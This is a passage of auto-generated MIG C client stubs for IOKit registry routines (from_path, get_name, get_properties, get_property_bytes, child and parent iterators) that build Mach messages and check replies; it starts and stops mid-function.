#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->pathCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->path, path, 512);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->pathCnt = (mach_msg_type_number_t) mig_strncpy(InP->path, path, 512);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->pathOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 512) + (_WALIGN_(InP->pathCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2809;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2809, "io_registry_entry_from_path")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2809, "io_registry_entry_from_path")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_from_path_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_from_path_t((__Reply__io_registry_entry_from_path_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_from_path_t__defined) */

	*registry_entry = Out0P->registry_entry.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_name_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_name_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_name_t(__Reply__io_registry_entry_get_name_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_name_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 2910) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 128)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->nameCnt > 128 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 128))< Out0P->nameCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 128) + _WALIGN_(Out0P->nameCnt)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_name_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_name */
mig_external kern_return_t io_registry_entry_get_name
(
	mach_port_t registry_entry,
	io_name_t name
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_registry_entry_get_name_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_name_t__defined */

	__DeclareSendRpc(2810, "io_registry_entry_get_name")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2810;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2810, "io_registry_entry_get_name")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2810, "io_registry_entry_get_name")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_name_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_name_t((__Reply__io_registry_entry_get_name_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_name_t__defined) */

	(void) mig_strncpy(name, Out0P->name, 128);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_properties_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_properties_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_properties_t(__Reply__io_registry_entry_get_properties_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_properties_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2911) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->properties.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->properties.size != Out0P->propertiesCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_properties_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_properties */
mig_external kern_return_t io_registry_entry_get_properties
(
	mach_port_t registry_entry,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_registry_entry_get_properties_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_properties_t__defined */

	__DeclareSendRpc(2811, "io_registry_entry_get_properties")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2811;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2811, "io_registry_entry_get_properties")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2811, "io_registry_entry_get_properties")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_properties_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_properties_t((__Reply__io_registry_entry_get_properties_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_properties_t__defined) */

	*properties = (io_buf_ptr_t)(Out0P->properties.address);
	*propertiesCnt = Out0P->propertiesCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_property_bytes_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_property_bytes_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_property_bytes_t(__Reply__io_registry_entry_get_property_bytes_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_property_bytes_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 2912) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 4096)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->dataCnt > 4096 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 4096))< Out0P->dataCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 4096) + _WALIGN_(Out0P->dataCnt)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_property_bytes_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_property_bytes */
mig_external kern_return_t io_registry_entry_get_property_bytes
(
	mach_port_t registry_entry,
	io_name_t property_name,
	io_struct_inband_t data,
	mach_msg_type_number_t *dataCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t property_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t property_nameCnt;
		char property_name[128];
		mach_msg_type_number_t dataCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t dataCnt;
		char data[4096];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t dataCnt;
		char data[4096];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_registry_entry_get_property_bytes_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_property_bytes_t__defined */

	__DeclareSendRpc(2812, "io_registry_entry_get_property_bytes")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->property_nameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->property_name, property_name, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->property_nameCnt = (mach_msg_type_number_t) mig_strncpy(InP->property_name, property_name, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->property_nameOffset = 0;

	msgh_size_delta = _WALIGN_(InP->property_nameCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	if (*dataCnt < 4096)
		InP->dataCnt = *dataCnt;
	else
		InP->dataCnt = 4096;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2812;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2812, "io_registry_entry_get_property_bytes")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2812, "io_registry_entry_get_property_bytes")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_property_bytes_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_property_bytes_t((__Reply__io_registry_entry_get_property_bytes_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_property_bytes_t__defined) */

	if (Out0P->dataCnt > *dataCnt) {
		(void)memcpy((char *) data, (const char *) Out0P->data,  *dataCnt);
		*dataCnt = Out0P->dataCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) data, (const char *) Out0P->data, Out0P->dataCnt);

	*dataCnt = Out0P->dataCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_child_iterator_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_child_iterator_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_child_iterator_t(__Reply__io_registry_entry_get_child_iterator_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_child_iterator_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2913) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->iterator.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->iterator.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_child_iterator_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_child_iterator */
mig_external kern_return_t io_registry_entry_get_child_iterator
(
	mach_port_t registry_entry,
	io_name_t plane,
	mach_port_t *iterator
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_registry_entry_get_child_iterator_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_child_iterator_t__defined */

	__DeclareSendRpc(2813, "io_registry_entry_get_child_iterator")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->planeCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2813;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2813, "io_registry_entry_get_child_iterator")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2813, "io_registry_entry_get_child_iterator")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_child_iterator_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_child_iterator_t((__Reply__io_registry_entry_get_child_iterator_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_child_iterator_t__defined) */

	*iterator = Out0P->iterator.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_parent_iterator_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_parent_iterator_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_parent_iterator_t(__Reply__io_registry_entry_get_parent_iterator_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_parent_iterator_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2914) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->iterator.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->iterator.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_parent_iterator_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_parent_iterator */
mig_external kern_return_t io_registry_entry_get_parent_iterator
(
	mach_port_t registry_entry,
	io_name_t plane,
	mach_port_t *iterator
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_registry_entry_get_parent_iterator_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_parent_iterator_t__defined */

	__DeclareSendRpc(2814, "io_registry_entry_get_parent_iterator")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
